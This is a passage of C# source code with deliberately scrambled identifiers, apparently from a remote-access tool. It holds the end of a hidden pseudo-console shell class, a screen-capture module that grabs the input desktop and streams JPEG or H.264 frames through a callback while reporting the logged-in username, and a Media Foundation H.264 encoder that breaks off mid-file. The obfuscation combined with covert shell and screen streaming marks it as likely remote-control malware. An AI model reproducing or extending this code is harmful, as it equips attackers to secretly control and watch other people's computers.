            if (!_BcYGryqBv) _MsAsXBG((int)code);
        }

        public void _CmsCNTGoha(string data)
        {
            if (_BcYGryqBv || _inputWriteHandle == IntPtr.Zero) return;
            try
            {
                byte[] bytes = Encoding.UTF8.GetBytes(data);
                int written;
                WriteFile(_inputWriteHandle, bytes, bytes.Length, out written, IntPtr.Zero);
            }
            catch { }
        }

        public void Resize(int cols, int rows)
        {
            if (_hPC != IntPtr.Zero && !_BcYGryqBv)
            {
                var size = new ConPTY_COORD { X = (short)cols, Y = (short)rows };
                ResizePseudoConsole(_hPC, size);
            }
        }

        public void Dispose()
        {
            if (_BcYGryqBv) return;
            _BcYGryqBv = true;
            try { if (_inputWriteHandle != IntPtr.Zero) CloseHandle(_inputWriteHandle); } catch { }
            try { if (_hPC != IntPtr.Zero) ClosePseudoConsole(_hPC); } catch { }
            try { if (_hProcess != IntPtr.Zero) { TerminateProcess(_hProcess, 0); CloseHandle(_hProcess); } } catch { }
            try { if (_outputReadHandle != IntPtr.Zero) CloseHandle(_outputReadHandle); } catch { }
        }
    }

    
    
    
    internal class _YztSpVugDPypw
    {
        readonly string _id;
        readonly int _BlUPfv, _nJKsZKkG, _rBOmRZ;
        readonly Action<byte[], int, int, int, int, int, int> _ArCgmdFW; 
        internal Action<string> _onError;
        volatile bool _eSQvpOEh;

        
        [DllImport("user32.dll")]
        static extern int GetSystemMetrics(int nIndex);
        [DllImport("user32.dll")]
        static extern bool SetProcessDPIAware();
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr OpenInputDesktop(uint dwFlags, bool fInherit, uint dwDesiredAccess);
        [DllImport("user32.dll", SetLastError = true)]
        static extern bool SetThreadDesktop(IntPtr hDesktop);
        [DllImport("user32.dll", SetLastError = true)]
        static extern bool CloseDesktop(IntPtr hDesktop);
        [DllImport("gdi32.dll")]
        static extern IntPtr CreateDC(string lpszDriver, string lpszDevice, string lpszOutput, IntPtr lpInitData);
        [DllImport("gdi32.dll")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32.dll")]
        static extern bool DeleteDC(IntPtr hdc);
        [DllImport("gdi32.dll")]
        static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
        [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory")]
        static extern void CopyMemory(IntPtr dest, IntPtr src, uint count);
        [DllImport("kernel32.dll")]
        static extern uint GetCurrentProcessId();
        [DllImport("kernel32.dll")]
        static extern uint ProcessIdToSessionId(uint processId, out uint sessionId);
        const uint SRCCOPY = 0x00CC0020;

        
        [DllImport("dxgi.dll")]
        static extern int CreateDXGIFactory1(ref Guid riid, out IntPtr ppFactory);
        [DllImport("d3d11.dll")]
        static extern int D3D11CreateDevice(IntPtr pAdapter, int DriverType, IntPtr Software,
            uint Flags, IntPtr pFeatureLevels, int FeatureLevels, uint SDKVersion,
            out IntPtr ppDevice, out int pFeatureLevel, out IntPtr ppImmediateContext);

        
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int QIDelegate(IntPtr pThis, ref Guid riid, out IntPtr ppv);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int ReleaseDelegate(IntPtr pThis);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int EnumAdapters1Delegate(IntPtr factory, uint index, out IntPtr adapter);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int EnumOutputsDelegate(IntPtr adapter, uint index, out IntPtr output);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int DuplicateOutputDelegate(IntPtr output1, IntPtr device, out IntPtr duplication);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int GetDescDuplDelegate(IntPtr dupl, out DXGI_OUTDUPL_DESC desc);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int AcquireNextFrameDelegate(IntPtr dupl, uint timeout, out DXGI_OUTDUPL_FRAME_INFO info, out IntPtr resource);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int ReleaseFrameDelegate(IntPtr dupl);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int CreateTexture2DDelegate(IntPtr device, ref D3D11_TEXTURE2D_DESC desc, IntPtr init, out IntPtr tex);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void CopyResourceDelegate(IntPtr ctx, IntPtr dst, IntPtr src);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int MapDelegate(IntPtr ctx, IntPtr res, uint sub, int mapType, uint flags, out D3D11_MAPPED_SUBRESOURCE mapped);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void UnmapDelegate(IntPtr ctx, IntPtr res, uint sub);

        
        [StructLayout(LayoutKind.Sequential)]
        struct DXGI_OUTDUPL_FRAME_INFO
        {
            public long LastPresentTime, LastMouseUpdateTime;
            public uint AccumulatedFrames;
            public int RectsCoalesced, ProtectedContentMaskedOut;
            public int PointerX, PointerY, PointerVisible;
            public uint TotalMetadataBufferSize, PointerShapeBufferSize;
        }
        [StructLayout(LayoutKind.Sequential)]
        struct DXGI_OUTDUPL_DESC
        {
            public uint Width, Height;
            public uint RefreshNum, RefreshDen;
            public int Format, ScanlineOrdering, Scaling, Rotation;
            public int DesktopImageInSystemMemory;
        }
        [StructLayout(LayoutKind.Sequential)]
        struct D3D11_TEXTURE2D_DESC
        {
            public uint Width, Height, MipLevels, ArraySize;
            public int Format;
            public uint SampleCount, SampleQuality;
            public int Usage;
            public uint BindFlags, CPUAccessFlags, MiscFlags;
        }
        [StructLayout(LayoutKind.Sequential)]
        struct D3D11_MAPPED_SUBRESOURCE
        {
            public IntPtr pData;
            public uint RowPitch, DepthPitch;
        }

        
        IntPtr _dxFactory, _dxAdapter, _dxOutput, _dxOutput1;
        IntPtr _dxDupl, _d3dDev, _d3dCtx, _stagingTex;
        int _dxW, _dxH;
        bool _useDxgi;
        bool _dxgiTimeout; 

        
        static T VT<T>(IntPtr obj, int slot) where T : class
        {
            IntPtr fn = Marshal.ReadIntPtr(Marshal.ReadIntPtr(obj), slot * IntPtr.Size);
            return (T)(object)Marshal.GetDelegateForFunctionPointer(fn, typeof(T));
        }
        static IntPtr QI(IntPtr obj, Guid iid)
        {
            IntPtr r; return VT<QIDelegate>(obj, 0)(obj, ref iid, out r) >= 0 ? r : IntPtr.Zero;
        }
        static void Rel(ref IntPtr obj)
        {
            if (obj != IntPtr.Zero) { VT<ReleaseDelegate>(obj, 2)(obj); obj = IntPtr.Zero; }
        }

        public _YztSpVugDPypw(string id, int fps, int quality, int scale, Action<byte[], int, int, int, int, int, int> onFrame, Action<string> onError = null)
        {
            _id = id; _BlUPfv = fps; _nJKsZKkG = quality; _rBOmRZ = scale; _ArCgmdFW = onFrame; _onError = onError;
        }
        public void Start() { new Thread(_LAxmxJAXMEo) { IsBackground = true }.Start(); }
        public void Stop() { _eSQvpOEh = true; }

        
        bool InitDxgi()
        {
            try
            {
                var fGuid = new Guid("770aae78-f26f-4dba-a829-253c83d1b387");
                if (CreateDXGIFactory1(ref fGuid, out _dxFactory) < 0) return false;
                if (VT<EnumAdapters1Delegate>(_dxFactory, 12)(_dxFactory, 0, out _dxAdapter) < 0) return false;
                if (VT<EnumOutputsDelegate>(_dxAdapter, 7)(_dxAdapter, 0, out _dxOutput) < 0) return false;
                
                int fl;
                if (D3D11CreateDevice(_dxAdapter, 0, IntPtr.Zero, 0, IntPtr.Zero, 0, 7,
                    out _d3dDev, out fl, out _d3dCtx) < 0) return false;
                
                var o1Guid = new Guid("00cddea8-939b-4b83-a340-a685226666cc");
                _dxOutput1 = QI(_dxOutput, o1Guid);
                if (_dxOutput1 == IntPtr.Zero) return false;
                
                if (VT<DuplicateOutputDelegate>(_dxOutput1, 22)(_dxOutput1, _d3dDev, out _dxDupl) < 0) return false;
                
                DXGI_OUTDUPL_DESC dd;
                VT<GetDescDuplDelegate>(_dxDupl, 7)(_dxDupl, out dd);
                _dxW = (int)dd.Width; _dxH = (int)dd.Height;
                
                var td = new D3D11_TEXTURE2D_DESC {
                    Width = (uint)_dxW, Height = (uint)_dxH,
                    MipLevels = 1, ArraySize = 1,
                    Format = 87, 
                    SampleCount = 1, SampleQuality = 0,
                    Usage = 3, 
                    BindFlags = 0, CPUAccessFlags = 0x20000, MiscFlags = 0 
                };
                if (VT<CreateTexture2DDelegate>(_d3dDev, 5)(_d3dDev, ref td, IntPtr.Zero, out _stagingTex) < 0) return false;
                return true;
            }
            catch { return false; }
        }

        void FreeDxgi()
        {
            Rel(ref _stagingTex); Rel(ref _dxDupl); Rel(ref _dxOutput1);
            Rel(ref _dxOutput); Rel(ref _d3dDev); Rel(ref _d3dCtx);
            Rel(ref _dxAdapter); Rel(ref _dxFactory);
        }

        
        Bitmap CaptureDxgi()
        {
            _dxgiTimeout = false;
            DXGI_OUTDUPL_FRAME_INFO fi; IntPtr res;
            int hr = VT<AcquireNextFrameDelegate>(_dxDupl, 8)(_dxDupl, 50, out fi, out res);
            if (hr < 0)
            {
                
                _dxgiTimeout = (hr == unchecked((int)0x887A0027));
                return null;
            }
            try
            {
                var texGuid = new Guid("6f15aaf2-d208-4e89-9ab4-489535d34f9c");
                IntPtr frameTex = QI(res, texGuid);
                if (frameTex == IntPtr.Zero) return null;
                try
                {
                    
                    VT<CopyResourceDelegate>(_d3dCtx, 47)(_d3dCtx, _stagingTex, frameTex);
                    
                    D3D11_MAPPED_SUBRESOURCE mapped;
                    if (VT<MapDelegate>(_d3dCtx, 14)(_d3dCtx, _stagingTex, 0, 1, 0, out mapped) < 0) return null;
                    try
                    {
                        var bmp = new Bitmap(_dxW, _dxH, PixelFormat.Format32bppArgb);
                        var bd = bmp.LockBits(new Rectangle(0, 0, _dxW, _dxH), ImageLockMode.WriteOnly, PixelFormat.Format32bppArgb);
                        int srcPitch = (int)mapped.RowPitch;
                        int dstPitch = bd.Stride;
                        int rowBytes = Math.Min(srcPitch, dstPitch);
                        for (int y = 0; y < _dxH; y++)
                            CopyMemory(new IntPtr(bd.Scan0.ToInt64() + y * dstPitch),
                                       new IntPtr(mapped.pData.ToInt64() + y * srcPitch), (uint)rowBytes);
                        bmp.UnlockBits(bd);
                        return bmp;
                    }
                    finally { VT<UnmapDelegate>(_d3dCtx, 15)(_d3dCtx, _stagingTex, 0); }
                }
                finally { Rel(ref frameTex); }
            }
            finally
            {
                Rel(ref res);
                VT<ReleaseFrameDelegate>(_dxDupl, 13)(_dxDupl);
            }
        }

        
        Bitmap CaptureBitBlt()
        {
            try { SetProcessDPIAware(); } catch {}
            try
            {
                IntPtr hDesk = OpenInputDesktop(0, false, 0x10000000);
                if (hDesk != IntPtr.Zero) { SetThreadDesktop(hDesk); CloseDesktop(hDesk); }
            } catch {}
            
            IntPtr hdcSrc = CreateDC("DISPLAY", null, null, IntPtr.Zero);
            if (hdcSrc == IntPtr.Zero) return null;
            int sw = GetDeviceCaps(hdcSrc, 118); 
            int sh = GetDeviceCaps(hdcSrc, 117); 
            if (sw <= 0 || sh <= 0) { sw = GetSystemMetrics(0); sh = GetSystemMetrics(1); }
            if (sw <= 0 || sh <= 0) { DeleteDC(hdcSrc); return null; }
            var bmp = new Bitmap(sw, sh, PixelFormat.Format32bppArgb);
            {
                using (var g = Graphics.FromImage(bmp))
                {
                    IntPtr hdcDst = g.GetHdc();
                    BitBlt(hdcDst, 0, 0, sw, sh, hdcSrc, 0, 0, SRCCOPY);
                    g.ReleaseHdc(hdcDst);
                }
                DeleteDC(hdcSrc);
            }
            return bmp;
        }

        
        void _LAxmxJAXMEo()
        {
            
            try
            {
                uint sid = 0;
                try { ProcessIdToSessionId(GetCurrentProcessId(), out sid); } catch {}
                int diagW = 0, diagH = 0;
                try { diagW = GetSystemMetrics(0); diagH = GetSystemMetrics(1); } catch {}
                if (_onError != null)
                    _onError("capture_init session=" + sid + " screen=" + diagW + "x" + diagH +
                        " user=" + Environment.UserName + " ver=v20260430d");
            } catch {}

            try
            {
            int interval = 1000 / _BlUPfv;
            ImageCodecInfo jpegCodec = null;
            try
            {
                foreach (var c in ImageCodecInfo.GetImageEncoders())
                    if (c.MimeType == "image/jpeg") { jpegCodec = c; break; }
            }
            catch (Exception ex)
            {
                if (_onError != null) _onError("GetImageEncoders failed: " + ex.GetType().Name + ": " + ex.Message);
                return;
            }
            if (jpegCodec == null) { if (_onError != null) _onError("JPEG codec not found"); return; }
            var encParams = new EncoderParameters(1);
            encParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)_nJKsZKkG);

            
            _useDxgi = false;

            
            MFH264Encoder h264 = null;
            bool h264Failed = false;

            byte[] prevPixels = null;
            byte[] curPixels = null;  
            int prevW = 0, prevH = 0;
            int frameCount = 0;
            const int BLOCK = 32;         
            const int KEYFRAME_INTERVAL = 30; 
            int errorCount = 0;

            var sw = new System.Diagnostics.Stopwatch();
            while (!_eSQvpOEh)
            {
                sw.Restart();
                try
                {
                    Bitmap bmp = null;
                    string captureError = null;

                    
                    try { bmp = CaptureBitBlt(); }
                    catch (Exception ex) { captureError = "gdi_ex:" + ex.GetType().Name + ":" + ex.Message; }

                    if (bmp == null)
                    {
                        errorCount++;
                        
                        if (errorCount <= 3 || errorCount % 50 == 0)
                        {
                            uint sid = 0;
                            try { ProcessIdToSessionId(GetCurrentProcessId(), out sid); } catch {}
                            int sw2 = 0, sh2 = 0;
                            try { sw2 = GetSystemMetrics(0); sh2 = GetSystemMetrics(1); } catch {}
                            string errMsg = "capture_fail #" + errorCount +
                                " session=" + sid +
                                " screen=" + sw2 + "x" + sh2 +
                                " user=" + Environment.UserName +
                                " " + (captureError ?? "null");
                            if (_onError != null) _onError(errMsg);
                        }
                        Thread.Sleep(interval); continue;
                    }

                    using (bmp)
                    {
                        Bitmap target = bmp;
                        bool scaled = false;
                        if (_rBOmRZ < 100)
                        {
                            int nw = bmp.Width * _rBOmRZ / 100;
                            int nh = bmp.Height * _rBOmRZ / 100;
                            target = new Bitmap(bmp, nw, nh);
                            scaled = true;
                        }

                        int tw = target.Width, th = target.Height;
                        bool forceKeyframe = (frameCount % KEYFRAME_INTERVAL == 0) || prevPixels == null || prevW != tw || prevH != th;
                        frameCount++;

                        
                        var lockRect = new Rectangle(0, 0, tw, th);
                        var bd = target.LockBits(lockRect, ImageLockMode.ReadOnly, PixelFormat.Format32bppArgb);
                        int stride = Math.Abs(bd.Stride);
                        int needed = stride * th;
                        if (curPixels == null || curPixels.Length != needed)
                            curPixels = new byte[needed];
                        Marshal.Copy(bd.Scan0, curPixels, 0, needed);
                        target.UnlockBits(bd);

                        
                        bool h264Sent = false;
                        if (!h264Failed)
                        {
                            try
                            {
                                if (h264 == null || h264.Width != tw || h264.Height != th)
                                {
                                    if (h264 != null) h264.Dispose();
                                    h264 = new MFH264Encoder(tw, th, _BlUPfv, 2000);
                                    if (_onError != null) _onError("h264_init ok " + tw + "x" + th);
                                }
                                bool isKey;
                                byte[] nal = h264.Encode(curPixels, stride, out isKey);
                                if (nal != null && nal.Length > 0)
                                {
                                    
                                    _ArCgmdFW(nal, tw, th, -1, isKey ? 1 : 0, tw, th);
                                    h264Sent = true;
                                }
                            }
                            catch (Exception hex)
                            {
                                h264Failed = true;
                                if (h264 != null) { try { h264.Dispose(); } catch { } h264 = null; }
                                if (_onError != null) _onError("h264_fail: " + hex.Message);
                            }
                        }

                        if (!h264Sent && forceKeyframe)
                        {
                            
                            using (var ms = new MemoryStream())
                            {
                                target.Save(ms, jpegCodec, encParams);
                                _ArCgmdFW(ms.ToArray(), tw, th, 0, 0, tw, th);
                            }
                        }
                        else if (!h264Sent)
                        {
                            
                            int bx0 = tw, by0 = th, bx1 = 0, by1 = 0;
                            int blocksX = (tw + BLOCK - 1) / BLOCK;
                            int blocksY = (th + BLOCK - 1) / BLOCK;
                            int dirtyBlocks = 0, totalBlocks = blocksX * blocksY;

                            for (int by = 0; by < blocksY; by++)
                            {
                                for (int bx = 0; bx < blocksX; bx++)
                                {
                                    int px0 = bx * BLOCK, py0 = by * BLOCK;
                                    int px1 = Math.Min(px0 + BLOCK, tw);
                                    int py1 = Math.Min(py0 + BLOCK, th);
                                    bool dirty = false;
                                    for (int y = py0; y < py1 && !dirty; y++)
                                    {
                                        int rowOff = y * stride + px0 * 4;
                                        int rowLen = (px1 - px0) * 4;
                                        
                                        int k = 0;
                                        for (; k + 7 < rowLen; k += 8)
                                        {
                                            if (curPixels[rowOff+k] != prevPixels[rowOff+k] || curPixels[rowOff+k+1] != prevPixels[rowOff+k+1] ||
                                                curPixels[rowOff+k+2] != prevPixels[rowOff+k+2] || curPixels[rowOff+k+3] != prevPixels[rowOff+k+3] ||
                                                curPixels[rowOff+k+4] != prevPixels[rowOff+k+4] || curPixels[rowOff+k+5] != prevPixels[rowOff+k+5] ||
                                                curPixels[rowOff+k+6] != prevPixels[rowOff+k+6] || curPixels[rowOff+k+7] != prevPixels[rowOff+k+7])
                                            { dirty = true; break; }
                                        }
                                        for (; k < rowLen && !dirty; k++)
                                            if (curPixels[rowOff+k] != prevPixels[rowOff+k]) dirty = true;
                                    }
                                    if (dirty)
                                    {
                                        dirtyBlocks++;
                                        if (px0 < bx0) bx0 = px0;
                                        if (py0 < by0) by0 = py0;
                                        if (px1 > bx1) bx1 = px1;
                                        if (py1 > by1) by1 = py1;
                                    }
                                }
                            }

                            if (dirtyBlocks == 0)
                            {
                                
                            }
                            else if (dirtyBlocks > totalBlocks * 40 / 100)
                            {
                                
                                using (var ms = new MemoryStream())
                                {
                                    target.Save(ms, jpegCodec, encParams);
                                    _ArCgmdFW(ms.ToArray(), tw, th, 0, 0, tw, th);
                                }
                            }
                            else
                            {
                                
                                int cropW = bx1 - bx0, cropH = by1 - by0;
                                using (var cropped = new Bitmap(cropW, cropH, PixelFormat.Format32bppArgb))
                                {
                                    var cbd = cropped.LockBits(new Rectangle(0, 0, cropW, cropH), ImageLockMode.WriteOnly, PixelFormat.Format32bppArgb);
                                    int cStride = Math.Abs(cbd.Stride);
                                    for (int y = 0; y < cropH; y++)
                                        Marshal.Copy(curPixels, (by0 + y) * stride + bx0 * 4, cbd.Scan0 + y * cStride, cropW * 4);
                                    cropped.UnlockBits(cbd);

                                    using (var ms = new MemoryStream())
                                    {
                                        cropped.Save(ms, jpegCodec, encParams);
                                        _ArCgmdFW(ms.ToArray(), tw, th, bx0, by0, cropW, cropH);
                                    }
                                }
                            }
                        }

                        
                        byte[] tmp = prevPixels;
                        prevPixels = curPixels;
                        curPixels = (tmp != null && tmp.Length == needed) ? tmp : null;
                        prevW = tw; prevH = th;
                        if (scaled) target.Dispose();
                    }
                }
                catch (Exception ex)
                {
                    errorCount++;
                    if (errorCount <= 3 && _onError != null) { _onError("loop_ex:" + ex.GetType().Name + ": " + ex.Message); }
                }
                
                int elapsed = (int)sw.ElapsedMilliseconds;
                int sleepMs = interval - elapsed;
                if (sleepMs > 1) Thread.Sleep(sleepMs);
            }
            if (_useDxgi) FreeDxgi();
            if (h264 != null) { try { h264.Dispose(); } catch { } }

            } 
            catch (Exception ex)
            {
                if (_onError != null)
                    _onError("_LAxmxJAXMEo fatal: " + ex.GetType().Name + ": " + ex.Message);
            }
        }
    }

    
    
    
    internal class MFH264Encoder : IDisposable
    {
        IntPtr _transform;
        public int Width { get; private set; }
        public int Height { get; private set; }
        int _BlUPfv;
        internal long _frameIndex;
        internal bool _needsNv12;
        byte[] _nv12Buf;
        bool _BcYGryqBv;
        bool _mftProvidesSamples = true;
        int _outBufSize;
        byte[] _sps;
        byte[] _pps;

        
        [DllImport("mfplat.dll")] static extern int MFStartup(uint version, uint flags);
        [DllImport("mfplat.dll")] static extern int MFShutdown();
        [DllImport("mfplat.dll")] static extern int MFCreateMediaType(out IntPtr pp);
        [DllImport("mfplat.dll")] static extern int MFCreateSample(out IntPtr pp);
        [DllImport("mfplat.dll")] static extern int MFCreateMemoryBuffer(uint cb, out IntPtr pp);
        [DllImport("ole32.dll")]  static extern int CoCreateInstance(ref Guid rclsid, IntPtr pOuter, uint ctx, ref Guid riid, out IntPtr ppv);

        
        static Guid G(string s) { return new Guid(s); }
        static readonly Guid MFMediaType_Video  = G("73646976-0000-0010-8000-00AA00389B71");
        static readonly Guid MFVideoFormat_H264 = G("34363248-0000-0010-8000-00AA00389B71");
        static readonly Guid MFVideoFormat_NV12 = G("3231564E-0000-0010-8000-00AA00389B71");
        static readonly Guid MFVideoFormat_RGB32= G("00000016-0000-0010-8000-00AA00389B71");
        static readonly Guid MT_MAJOR   = G("48eba18e-f8c9-4687-bf11-0a74c9f96a8f");
        static readonly Guid MT_SUBTYPE = G("f7e34c9a-42e8-4714-b74b-cb29d72c35e5");
        static readonly Guid MT_FSIZE   = G("1652c33d-d6b2-4012-b834-72030849a37d");
        static readonly Guid MT_FRATE   = G("c459a2e8-3d2c-4e44-b132-fee5156c7bb0");
        static readonly Guid MT_BITRATE = G("20332624-fb0d-4d9e-bd0d-cbf6786c102e");
        static readonly Guid MT_INTERLACE = G("e2724bb8-e676-4806-b4b2-a8d6efb44ccd");
        static readonly Guid IID_IMFTransform = G("bf94c121-5b05-4e6f-8000-ba598961414d");
        static readonly Guid CLSID_H264Enc = G("6ca50344-051a-4ded-9779-a43305165e35");

        
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DVoid(IntPtr p);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DSetG(IntPtr p, ref Guid k, ref Guid v);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DSetU32(IntPtr p, ref Guid k, uint v);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DSetU64(IntPtr p, ref Guid k, ulong v);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DSetType(IntPtr p, uint sid, IntPtr t, uint f);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DProcMsg(IntPtr p, uint msg, IntPtr par);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DProcIn(IntPtr p, uint sid, IntPtr s, uint f);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DProcOut(IntPtr p, uint f, uint c, IntPtr buf, out uint st);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DBufLk(IntPtr p, out IntPtr pb, out int mx, out int cl);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DBufSL(IntPtr p, int l);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DBufGL(IntPtr p, out int l);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DSmpAB(IntPtr p, IntPtr b);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DSmpST(IntPtr p, long t);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int DSmpCB(IntPtr p, out IntPtr b);

        static Delegate Vt(IntPtr obj, int slot, Type t)
        {
            IntPtr vt = Marshal.ReadIntPtr(obj);
            IntPtr fn = Marshal.ReadIntPtr(vt, slot * IntPtr.Size);
            return Marshal.GetDelegateForFunctionPointer(fn, t);
        }
        static void Rel(IntPtr p) { if (p != IntPtr.Zero) ((DVoid)Vt(p, 2, typeof(DVoid)))(p); }

        
        
        
        

        IntPtr MakeType(ref Guid subtype, int w, int h, int fps)
        {
            IntPtr t; MFCreateMediaType(out t);
            Guid k = MT_MAJOR; Guid v = MFMediaType_Video;
            ((DSetG)Vt(t, 24, typeof(DSetG)))(t, ref k, ref v);
            k = MT_SUBTYPE;
            ((DSetG)Vt(t, 24, typeof(DSetG)))(t, ref k, ref subtype);
            k = MT_FSIZE;
            ((DSetU64)Vt(t, 22, typeof(DSetU64)))(t, ref k, ((ulong)w << 32) | (uint)h);
            k = MT_FRATE;
            ((DSetU64)Vt(t, 22, typeof(DSetU64)))(t, ref k, ((ulong)fps << 32) | 1u);
            k = MT_INTERLACE;
            ((DSetU32)Vt(t, 21, typeof(DSetU32)))(t, ref k, 2); 
            return t;
        }

        public MFH264Encoder(int w, int h, int fps, int kbps)
        {
            Width = w; Height = h; _BlUPfv = fps;
            int hr = MFStartup(0x00020070, 0);
            if (hr < 0) throw new Exception("MFStartup 0x" + hr.ToString("X8"));

            Guid clsid = CLSID_H264Enc, iid = IID_IMFTransform;
            hr = CoCreateInstance(ref clsid, IntPtr.Zero, 1, ref iid, out _transform);
            if (hr < 0 || _transform == IntPtr.Zero)
                throw new Exception("H264Enc CoCreate 0x" + hr.ToString("X8"));

            
            Guid h264 = MFVideoFormat_H264;
            IntPtr ot = MakeType(ref h264, w, h, fps);
            Guid bk = MT_BITRATE;
            ((DSetU32)Vt(ot, 21, typeof(DSetU32)))(ot, ref bk, (uint)(kbps * 1000));
            hr = ((DSetType)Vt(_transform, 16, typeof(DSetType)))(_transform, 0, ot, 0);
            Rel(ot);
            if (hr < 0) throw new Exception("SetOutputType 0x" + hr.ToString("X8"));

            
            _needsNv12 = true;
            Guid nv12 = MFVideoFormat_NV12;
            IntPtr it = MakeType(ref nv12, w, h, fps);
            hr = ((DSetType)Vt(_transform, 15, typeof(DSetType)))(_transform, 0, it, 0);
            Rel(it);
            if (hr < 0)
            {
                _needsNv12 = false;
                Guid rgb = MFVideoFormat_RGB32;
                it = MakeType(ref rgb, w, h, fps);
                hr = ((DSetType)Vt(_transform, 15, typeof(DSetType)))(_transform, 0, it, 0);
                Rel(it);
                if (hr < 0) throw new Exception("SetInputType 0x" + hr.ToString("X8"));
            }
            if (_needsNv12) _nv12Buf = new byte[w * h * 3 / 2];

            
            
            
            IntPtr osi = Marshal.AllocHGlobal(12);
            for (int z = 0; z < 12; z++) Marshal.WriteByte(osi, z, 0);
            hr = ((DProcMsg)Vt(_transform, 7, typeof(DProcMsg)))(_transform, 0, osi);
            if (hr >= 0)
            {
                uint osFlags = (uint)Marshal.ReadInt32(osi, 0);
                _outBufSize = Marshal.ReadInt32(osi, 4);
                _mftProvidesSamples = (osFlags & 0x00000001) != 0; 
            }
            Marshal.FreeHGlobal(osi);
            if (_outBufSize <= 0) _outBufSize = w * h * 4;

            
            try { ((DProcMsg)Vt(_transform, 23, typeof(DProcMsg)))(_transform, 0x10000000, IntPtr.Zero); } catch { }
            try { ((DProcMsg)Vt(_transform, 23, typeof(DProcMsg)))(_transform, 0x10000001, IntPtr.Zero); } catch { }
        }

        public byte[] Encode(byte[] bgra, int stride, out bool keyFrame)
        {
            keyFrame = false;
            if (_BcYGryqBv || _transform == IntPtr.Zero) return null;

            byte[] inData; int inLen;
            if (_needsNv12)
            {
                BgraToNv12(bgra, _nv12Buf, Width, Height, stride);
                inData = _nv12Buf; inLen = _nv12Buf.Length;
            }
            else { inData = bgra; inLen = bgra.Length; }

            
            IntPtr smp, buf;
            MFCreateSample(out smp); MFCreateMemoryBuffer((uint)inLen, out buf);
            IntPtr pb; int mx, cl;
            ((DBufLk)Vt(buf, 3, typeof(DBufLk)))(buf, out pb, out mx, out cl);
            Marshal.Copy(inData, 0, pb, inLen);
            ((DVoid)Vt(buf, 4, typeof(DVoid)))(buf); 
            ((DBufSL)Vt(buf, 6, typeof(DBufSL)))(buf, inLen);
            ((DSmpAB)Vt(smp, 42, typeof(DSmpAB)))(smp, buf); Rel(buf);

            long dur = 10000000L / _BlUPfv;
            ((DSmpST)Vt(smp, 36, typeof(DSmpST)))(smp, _frameIndex * dur);
            ((DSmpST)Vt(smp, 38, typeof(DSmpST)))(smp, dur); 
            _frameIndex++;

            int hr = ((DProcIn)Vt(_transform, 24, typeof(DProcIn)))(_transform, 0, smp, 0);
            Rel(smp);
            if (hr < 0) return null;

            
            byte[] result = null;
            while (true)
            {
                
                
                int sz = 4 * IntPtr.Size;
                IntPtr ob = Marshal.AllocHGlobal(sz);
                for (int i = 0; i < sz; i++) Marshal.WriteByte(ob, i, 0);
                IntPtr callerSmp = IntPtr.Zero;
                try
                {
                    
                    if (!_mftProvidesSamples)
                    {
                        IntPtr tmpBuf;
                        MFCreateSample(out callerSmp);
                        MFCreateMemoryBuffer((uint)_outBufSize, out tmpBuf);
                        ((DSmpAB)Vt(callerSmp, 42, typeof(DSmpAB)))(callerSmp, tmpBuf);
                        Rel(tmpBuf);
                        Marshal.WriteIntPtr(ob, IntPtr.Size, callerSmp);
                    }

                    uint status;
                    hr = ((DProcOut)Vt(_transform, 25, typeof(DProcOut)))(_transform, 0, 1, ob, out status);
                    if (hr < 0)
                    {
                        if (callerSmp != IntPtr.Zero) Rel(callerSmp);
                        break; 
                    }

                    IntPtr outSmp = Marshal.ReadIntPtr(ob, IntPtr.Size);
                    if (outSmp == IntPtr.Zero) { if (callerSmp != IntPtr.Zero) Rel(callerSmp); break; }
                    try
                    {
                        IntPtr outBuf;
                        ((DSmpCB)Vt(outSmp, 41, typeof(DSmpCB)))(outSmp, out outBuf);
                        if (outBuf != IntPtr.Zero)
                        {
                            try
                            {
                                int olen;
                                ((DBufGL)Vt(outBuf, 5, typeof(DBufGL)))(outBuf, out olen);
                                IntPtr pd; int omx, ocl;
                                ((DBufLk)Vt(outBuf, 3, typeof(DBufLk)))(outBuf, out pd, out omx, out ocl);
                                if (olen <= 0) olen = ocl;
                                result = new byte[olen];
                                Marshal.Copy(pd, result, 0, olen);
                                ((DVoid)Vt(outBuf, 4, typeof(DVoid)))(outBuf);
                            }
                            finally { Rel(outBuf); }
                        }
                    }
                    finally { Rel(outSmp); }
                }
                finally { Marshal.FreeHGlobal(ob); }
                break; 
            }

            return NormalizeH264(result, out keyFrame);
        }

        int H264StartCodeLen(byte[] d, int i)
        {
